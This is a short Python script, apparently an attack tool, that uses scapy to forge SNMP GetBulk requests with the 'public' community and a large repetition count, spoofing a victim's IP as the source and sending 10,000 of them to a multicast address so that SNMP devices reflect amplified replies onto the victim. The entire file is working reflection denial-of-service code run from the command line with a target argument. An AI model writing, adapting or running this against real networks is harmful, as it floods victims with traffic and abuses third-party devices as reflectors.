from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether
from scapy.layers.snmp import SNMP, SNMPvarbind, SNMPbulk

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


def snmp_attack_ethernet(target_ip):
    print(f"Starting SNMP attack for '{target_ip}'")
    dst_ip = "224.0.0.1"

    oid = "1.3.6.1.2.1.4.24"
    snmp_community = "public"
    snmp_version = 1  # v2c
    snmp_bulk_pdu = SNMPbulk(
        id=RandInt(),
        non_repeaters=0,
        max_repetitions=1000,
        varbindlist=[SNMPvarbind(oid=oid)],
    )
    snmp_packet = SNMP(
        version=snmp_version, community=snmp_community, PDU=snmp_bulk_pdu
    )
    udp_packet = UDP(sport=RandShort(), dport=161)
    ip_packet = IP(src=target_ip, dst=dst_ip) / udp_packet / snmp_packet
    ethernet_packet = Ether() / ip_packet
    ethernet_packet.show()

    iface_name = "eth0"
    sendp(ethernet_packet, iface=iface_name, count=10000, inter=0.001)


def main() -> None:
    if len(sys.argv) != 2:
        print("Usage: %s target" % (sys.argv[0]))
        sys.exit(0)

    target = str(sys.argv[1])
    snmp_attack_ethernet(target)


if __name__ == "__main__":
    main()
